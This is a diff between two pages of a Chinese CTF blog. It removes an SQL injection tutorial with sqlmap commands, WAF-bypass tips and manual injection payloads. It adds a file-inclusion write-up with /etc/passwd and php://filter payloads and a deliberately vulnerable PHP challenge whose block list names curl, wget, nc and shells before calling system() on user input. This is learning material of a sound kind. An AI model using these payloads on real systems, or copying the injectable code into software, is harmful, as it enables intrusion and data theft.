@@ -19,23 +19,21 @@
   <meta name="author" content="suny">
   <meta name="keywords" content="">
   
-    <meta name="description" content="一、SQL 注入基础核心原理：用户输入未经过滤直接拼接到 SQL 语句中，导致恶意代码被执行。   CTF 常见注入类型：  联合查询注入（UNION） 布尔盲注 时间盲注 报错注入 堆叠查询注入 宽字节注入 二次注入  常见注入点  GET 参数：http:&#x2F;&#x2F;example.com&#x2F;page.php?id&#x3D;1 POST 参数：登录框、搜索框、留言板等表单提交的参数。 Cookie：Cookie">
+    <meta name="description" content="记录ez_include题解顺便学习一下文件包含漏洞首先打开容器，发现非常简短，只有一行代码 1include($_GET[&#x27;zpf&#x27;])  include可以包含文件，如txt文本格式，并把包含的文件当作php代码解析执行。 首先尝试利用?zpf&#x3D;&#x2F;etc&#x2F;passwd 读取系统目录，但并没有发现什么有价值的信息。 下面尝试利用?zpf&#x3D;php:&#x2F;&#x2F;filter&#x2F;conver">
 <meta property="og:type" content="article">
-<meta property="og:title" content="SQL注入">
-<meta property="og:url" content="https://www.sunynov.top/2025/11/15/SQL%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:title" content="文件包含漏洞">
+<meta property="og:url" content="https://www.sunynov.top/2025/11/19/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/index.html">
 <meta property="og:site_name" content="suny">
-<meta property="og:description" content="一、SQL 注入基础核心原理：用户输入未经过滤直接拼接到 SQL 语句中，导致恶意代码被执行。   CTF 常见注入类型：  联合查询注入（UNION） 布尔盲注 时间盲注 报错注入 堆叠查询注入 宽字节注入 二次注入  常见注入点  GET 参数：http:&#x2F;&#x2F;example.com&#x2F;page.php?id&#x3D;1 POST 参数：登录框、搜索框、留言板等表单提交的参数。 Cookie：Cookie">
+<meta property="og:description" content="记录ez_include题解顺便学习一下文件包含漏洞首先打开容器，发现非常简短，只有一行代码 1include($_GET[&#x27;zpf&#x27;])  include可以包含文件，如txt文本格式，并把包含的文件当作php代码解析执行。 首先尝试利用?zpf&#x3D;&#x2F;etc&#x2F;passwd 读取系统目录，但并没有发现什么有价值的信息。 下面尝试利用?zpf&#x3D;php:&#x2F;&#x2F;filter&#x2F;conver">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://pic1.imgdb.cn/item/69189f3e3203f7be000915ab.png">
-<meta property="article:published_time" content="2025-11-15T12:53:26.000Z">
-<meta property="article:modified_time" content="2025-11-15T15:40:55.572Z">
+<meta property="article:published_time" content="2025-11-19T09:03:18.000Z">
+<meta property="article:modified_time" content="2025-11-20T06:07:25.408Z">
 <meta property="article:author" content="suny">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://pic1.imgdb.cn/item/69189f3e3203f7be000915ab.png">
   
   
   
-  <title>SQL注入 - suny</title>
+  <title>文件包含漏洞 - suny</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -224,7 +222,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="SQL注入"></span>
+            <span id="subtitle" data-typed-text="文件包含漏洞"></span>
           
         </div>
 
@@ -240,8 +238,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2025-11-15 20:53" pubdate>
-          2025年11月15日 晚上
+        <time datetime="2025-11-19 17:03" pubdate>
+          2025年11月19日 下午
         </time>
       </span>
     
@@ -252,7 +250,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          984 字
+          296 字
         
       </span>
     
@@ -263,7 +261,7 @@
         
         
         
-          9 分钟
+          3 分钟
         
       </span>
     
@@ -300,12 +298,12 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">SQL注入</h1>
+            <h1 id="seo-header">文件包含漏洞</h1>
             
               <p id="updated-time" class="note note-info" style="">
                 
                   
-                    本文最后更新于 2025年11月15日 晚上
+                    本文最后更新于 2025年11月20日 下午
                   
                 
               </p>
@@ -313,193 +311,19 @@
             
               <div class="markdown-body">
                 
-                <h3 id="一、SQL-注入基础"><a href="#一、SQL-注入基础" class="headerlink" title="一、SQL 注入基础"></a>一、SQL 注入基础</h3><p><strong>核心原理</strong>：用户输入未经过滤直接拼接到 SQL 语句中，导致恶意代码被执行。  </p>
-<p><strong>CTF 常见注入类型</strong>：</p>
-<ul>
-<li><strong>联合查询注入（UNION）</strong></li>
-<li><strong>布尔盲注</strong></li>
-<li><strong>时间盲注</strong></li>
-<li><strong>报错注入</strong></li>
-<li><strong>堆叠查询注入</strong></li>
-<li><strong>宽字节注入</strong></li>
-<li><strong>二次注入</strong></li>
-</ul>
-<p><strong>常见注入点</strong></p>
-<ul>
-<li><strong>GET 参数</strong>：<code>http://example.com/page.php?id=1</code></li>
-<li><strong>POST 参数</strong>：登录框、搜索框、留言板等表单提交的参数。</li>
-<li><strong>Cookie</strong>：<code>Cookie: user=admin; session=abc123</code></li>
-<li><strong>HTTP 头部</strong>：<code>User-Agent</code>, <code>Referer</code>, <code>X-Forwarded-For</code> 等。</li>
-</ul>
-<h3 id="二、SQLmap-快速上手"><a href="#二、SQLmap-快速上手" class="headerlink" title="二、SQLmap 快速上手"></a>二、SQLmap 快速上手</h3><h4 id="关键参数说明"><a href="#关键参数说明" class="headerlink" title="关键参数说明"></a>关键参数说明</h4><table>
-<thead>
-<tr>
-<th>参数</th>
-<th>作用</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>-u</code></td>
-<td>指定目标 URL</td>
-</tr>
-<tr>
-<td><code>-r</code></td>
-<td>加载 HTTP 请求文件（Burp 抓包保存为 <code>.txt</code>）</td>
-</tr>
-<tr>
-<td><code>-p</code></td>
-<td>指定测试的参数（如 <code>id</code>、<code>username</code>）</td>
-</tr>
-<tr>
-<td><code>--dbs</code></td>
-<td>列出所有数据库</td>
-</tr>
-<tr>
-<td><code>-D &lt;db&gt;</code></td>
-<td>指定数据库</td>
-</tr>
-<tr>
-<td><code>--tables</code></td>
-<td>列出指定数据库的所有表</td>
-</tr>
-<tr>
-<td><code>-T &lt;table&gt;</code></td>
-<td>指定表</td>
-</tr>
-<tr>
-<td><code>--columns</code></td>
-<td>列出指定表的所有字段</td>
-</tr>
-<tr>
-<td><code>-C &lt;columns&gt;</code></td>
-<td>指定字段（多个用逗号分隔）</td>
-</tr>
-<tr>
-<td><code>--dump</code></td>
-<td>导出指定字段的数据</td>
-</tr>
-<tr>
-<td><code>--current-db</code></td>
-<td>获取当前数据库名</td>
-</tr>
-<tr>
-<td><code>--current-user</code></td>
-<td>获取当前数据库用户</td>
-</tr>
-<tr>
-<td><code>--technique</code></td>
-<td>指定注入技术（如 <code>B</code> 布尔盲注，<code>T</code> 时间盲注，<code>U</code> 联合查询）</td>
-</tr>
-<tr>
-<td><code>--time-sec</code></td>
-<td>时间盲注时的延迟时间（默认 5 秒）</td>
-</tr>
-<tr>
-<td><code>--tamper</code></td>
-<td>使用脚本绕过 WAF（如 <code>space2comment</code> 替换空格为注释）</td>
-</tr>
-<tr>
-<td><code>--threads</code></td>
-<td>多线程（默认 1，CTF 中建议 1-5 避免触发防护）</td>
-</tr>
-</tbody></table>
-<h3 id="三、CTF-常见场景与-SQLmap-实操"><a href="#三、CTF-常见场景与-SQLmap-实操" class="headerlink" title="三、CTF 常见场景与 SQLmap 实操"></a>三、CTF 常见场景与 SQLmap 实操</h3><h4 id="场景-1：GET-参数注入"><a href="#场景-1：GET-参数注入" class="headerlink" title="场景 1：GET 参数注入"></a>场景 1：GET 参数注入</h4><p><strong>示例 URL</strong>：<code>http://ctf.example.com/web1/?id=1</code>  </p>
-<p><strong>操作流程</strong>：</p>
-<ol>
-<li><p><strong>检测注入点</strong>：</p>
- <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">python sqlmap.py -u <span class="hljs-string">&quot;http://ctf.example.com/web1/?id=1&quot;</span><br></code></pre></td></tr></table></figure>
-</li>
-<li><p><strong>获取数据库</strong>：</p>
- <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">python sqlmap.py -u <span class="hljs-string">&quot;http://ctf.example.com/web1/?id=1&quot;</span> --dbs<br></code></pre></td></tr></table></figure>
-</li>
-<li><p><strong>获取表和字段</strong>：</p>
- <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Bash">python sqlmap.py -u <span class="hljs-string">&quot;http://ctf.example.com/web1/?id=1&quot;</span> -D ctf_db --tables<br>python sqlmap.py -u <span class="hljs-string">&quot;http://ctf.example.com/web1/?id=1&quot;</span> -D ctf_db -T flag --columns<br></code></pre></td></tr></table></figure>
-</li>
-<li><p><strong>导出数据</strong>：</p>
- <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">python sqlmap.py -u <span class="hljs-string">&quot;http://ctf.example.com/web1/?id=1&quot;</span> -D ctf_db -T flag -C flag --dump<br></code></pre></td></tr></table></figure></li>
-</ol>
-<h4 id="场景-2：POST-表单注入"><a href="#场景-2：POST-表单注入" class="headerlink" title="场景 2：POST 表单注入"></a>场景 2：POST 表单注入</h4><p><strong>示例</strong>：登录表单（<code>username</code> 和 <code>password</code> 参数）  </p>
-<p><strong>操作流程</strong>：</p>
-<ol>
-<li><p><strong>Burp 抓包并保存为</strong> <strong><code>request.txt</code></strong>：</p>
- <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-keyword">POST</span> <span class="hljs-string">/login.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>ctf.example.com<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>31<br><br><span class="language-ini"><span class="hljs-attr">username</span>=admin&amp;password=<span class="hljs-number">123456</span></span><br></code></pre></td></tr></table></figure>
-</li>
-<li><p><strong>SQLmap 检测</strong>：</p>
- <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">python sqlmap.py -r request.txt -p username  <span class="hljs-comment"># 指定测试 username 参数</span><br></code></pre></td></tr></table></figure>
-</li>
-<li><p><strong>后续操作同 GET 注入</strong>：</p>
- <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Bash">python sqlmap.py -r request.txt -p username --dbs<br><span class="hljs-comment"># ... 导出 flag</span><br></code></pre></td></tr></table></figure></li>
-</ol>
-<h4 id="场景-3：布尔盲注（无回显）"><a href="#场景-3：布尔盲注（无回显）" class="headerlink" title="场景 3：布尔盲注（无回显）"></a>场景 3：布尔盲注（无回显）</h4><p><strong>特征</strong>：页面无报错，仅根据输入返回“正常”或“异常”（如登录成功&#x2F;失败）  </p>
-<p><strong>操作流程</strong>：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs Bash"><span class="hljs-comment"># 指定布尔盲注技术</span><br>python sqlmap.py -r request.txt -p username --technique B --dbs<br><span class="hljs-comment"># 导出数据（较慢，耐心等待）</span><br>python sqlmap.py -r request.txt -p username -D ctf_db -T flag -C flag --dump<br></code></pre></td></tr></table></figure>
+                <h2 id="记录ez-include题解顺便学习一下文件包含漏洞"><a href="#记录ez-include题解顺便学习一下文件包含漏洞" class="headerlink" title="记录ez_include题解顺便学习一下文件包含漏洞"></a>记录ez_include题解顺便学习一下文件包含漏洞</h2><p>首先打开容器，发现非常简短，只有一行代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;zpf&#x27;</span>])<br></code></pre></td></tr></table></figure>
 
+<p>include可以包含文件，如txt文本格式，并把包含的文件当作php代码解析执行。</p>
+<p>首先尝试利用<code>?zpf=/etc/passwd</code> 读取系统目录，但并没有发现什么有价值的信息。</p>
+<p>下面尝试利用<code>?zpf=php://filter/convert.base64-encode/resource=index.php</code> 获取源码</p>
+<p>经过Base64解码后得到源码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;zpf&#x27;</span>];<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>)) &#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;include(\$_GET[&#x27;zpf&#x27;])&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$a</span>);<br>        <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br>&#125;<br><br><br><span class="hljs-variable">$pattern</span> = <span class="hljs-string">&#x27;/(union|cat|tac|more|less|ls|tree|env|head|tail|nl|sed|awk|grep|strings|od|xxd|curl|wget|nc|netcat|python|perl|ruby|bash|sh|zsh|ksh|tcsh|cmd|powershell)/i&#x27;</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$pattern</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;yzx&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Dangerous command detected!&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;yzx&#x27;</span>]);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
-
-<h4 id="场景-4：时间盲注（无回显）"><a href="#场景-4：时间盲注（无回显）" class="headerlink" title="场景 4：时间盲注（无回显）"></a>场景 4：时间盲注（无回显）</h4><p><strong>特征</strong>：页面无任何差异，需通过响应时间判断  </p>
-<p><strong>操作流程</strong>：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs Bash"><span class="hljs-comment"># 指定时间盲注技术，设置延迟 3 秒</span><br>python sqlmap.py -r request.txt -p username --technique T --time-sec 3 --dbs<br><span class="hljs-comment"># 导出数据（非常慢，可适当调大 threads）</span><br>python sqlmap.py -r request.txt -p username -D ctf_db -T flag -C flag --dump --threads 3<br></code></pre></td></tr></table></figure>
-
-
-
-<h4 id="场景-5：宽字节注入（GBK-编码）"><a href="#场景-5：宽字节注入（GBK-编码）" class="headerlink" title="场景 5：宽字节注入（GBK 编码）"></a>场景 5：宽字节注入（GBK 编码）</h4><p><strong>特征</strong>：后端使用 <code>addslashes()</code> 或 <code>mysql_real_escape_string()</code> 过滤，但数据库为 GBK 编码  </p>
-<p><strong>操作流程</strong>：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Bash"><span class="hljs-comment"># 使用 tamper 脚本绕过</span><br>python sqlmap.py -u <span class="hljs-string">&quot;http://ctf.example.com/web5/?id=1&quot;</span> --tamper=gbkencode --dbs<br></code></pre></td></tr></table></figure>
-
-
-
-<h4 id="场景-6：二次注入"><a href="#场景-6：二次注入" class="headerlink" title="场景 6：二次注入"></a>场景 6：二次注入</h4><p><strong>特征</strong>：注入点不在初始输入，而在后续读取存储数据时触发（如注册用户名后登录）  </p>
-<p><strong>操作流程</strong>：</p>
-<ol>
-<li><p><strong>注册恶意用户名</strong>：<code>admin&#39; --</code>  </p>
-</li>
-<li><p>**Burp 抓包登录请求并保存为 ** <strong><code>login.txt</code></strong>  </p>
-</li>
-<li><p><strong>SQLmap 检测登录请求中的 ** <strong><code>username</code></strong> ** 参数</strong>：</p>
- <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">python sqlmap.py -r login.txt -p username --dbs<br></code></pre></td></tr></table></figure></li>
-</ol>
-<h3 id="四、CTF-技巧"><a href="#四、CTF-技巧" class="headerlink" title="四、CTF 技巧"></a>四、CTF 技巧</h3><ol>
-<li><p><strong>快速定位注入点</strong>：</p>
-<ul>
-<li><p>先手动测试（如 <code>&#39;</code>、<code>&quot;</code>、<code>and 1=1</code>、<code>and 1=2</code>）判断是否存在注入。</p>
-</li>
-<li><p>若手动难以判断，直接用 SQLmap 扫描。</p>
-</li>
-</ul>
-</li>
-<li><p><strong>绕过 WAF</strong>：</p>
-<ul>
-<li><p>使用 <code>--tamper</code> 脚本（常见：<code>space2comment</code>、<code>unionalltounion</code>、<code>randomcase</code>）。</p>
-</li>
-<li><p>手动修改请求头（如 <code>X-Forwarded-For</code> 伪造 IP）。</p>
-</li>
-</ul>
-</li>
-<li><p><strong>优化 SQLmap 速度</strong>：</p>
-<ul>
-<li><p>时间盲注时减小 <code>--time-sec</code>（如 2 秒）。</p>
-</li>
-<li><p>合理使用 <code>--threads</code>（1-5 为宜）。</p>
-</li>
-<li><p>明确目标后直接指定数据库、表、字段，避免全量扫描。</p>
-</li>
-</ul>
-</li>
-<li><p><strong>手动注入辅助</strong>：</p>
-<ul>
-<li><p>当 SQLmap 无法自动化时，手动构造 payload：</p>
-<ul>
-<li><p>联合查询：<code>id=1&#39; union select 1,2,database()--</code></p>
-</li>
-<li><p>布尔盲注：<code>id=1&#39; and length(database())&gt;5--</code></p>
-</li>
-<li><p>时间盲注：<code>id=1&#39; and sleep(5)--</code></p>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-</ol>
+<p>这里我们发现了非常关键的system函数，但程序对yzx进行了正则过滤，所以我们考虑绕过正则过滤，执行命令</p>
+<p>这里我使用了转义符号绕过，成功读取了目录拿到了flag</p>
+<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a target="_blank" rel="noopener" href="https://developer.aliyun.com/article/1224913">正则过滤绕过</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/lilongsy/article/details/108146107">文件包含漏洞</a></p>
 
                 
               </div>
@@ -507,27 +331,6 @@
             <hr/>
             <div>
               <div class="post-metas my-3">
-  
-    <div class="post-meta mr-3 d-flex align-items-center">
-      <i class="iconfont icon-category"></i>
-      
-
-<span class="category-chains">
-  
-  
-    
-      <span class="category-chain">
-        
-  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
-  
-  
-
-      </span>
-    
-  
-</span>
-
-    </div>
   
   
 </div>
@@ -538,8 +341,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>SQL注入</div>
-      <div>https://www.sunynov.top/2025/11/15/SQL注入/</div>
+      <div>文件包含漏洞</div>
+      <div>https://www.sunynov.top/2025/11/19/文件包含漏洞/</div>
     </div>
     <div class="license-meta">
       
@@ -551,7 +354,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2025年11月15日</div>
+          <div>2025年11月19日</div>
         </div>
       
       
@@ -583,9 +386,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2025/11/19/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" title="文件包含漏洞">
+                      <a href="/2025/11/20/CTF%E6%9D%82%E8%AE%B0/" title="CTF杂记">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">文件包含漏洞</span>
+                        <span class="hidden-mobile">CTF杂记</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -593,8 +396,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2025/11/08/CTFHub%E6%8A%80%E8%83%BD%E6%A0%91%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/" title="CTFHub技能树做题总结">
-                        <span class="hidden-mobile">CTFHub技能树做题总结</span>
+                      <a href="/2025/11/15/SQL%E6%B3%A8%E5%85%A5/" title="SQL注入">
+                        <span class="hidden-mobile">SQL注入</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
